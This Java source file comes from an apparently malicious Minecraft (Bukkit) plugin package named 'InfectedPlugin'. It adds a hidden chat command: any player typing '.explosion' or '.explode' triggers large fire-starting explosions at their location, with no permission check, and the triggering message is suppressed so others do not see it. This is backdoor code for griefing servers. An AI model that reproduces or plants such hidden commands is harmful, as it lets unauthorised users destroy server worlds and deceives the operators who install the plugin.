package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_explosion implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player player = event.getPlayer();
        Server server = Bukkit.getServer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".explosion") || args[0].equalsIgnoreCase(".explode"))
            {
                for (final Player target : server.getOnlinePlayers())
                {
                    target.getWorld().createExplosion(player.getLocation(), 10f, true);
                    target.sendMessage(ChatColor.DARK_RED + "BOOM!");
                }
                event.setCancelled(true);
                return;
            }
        }
    }
}
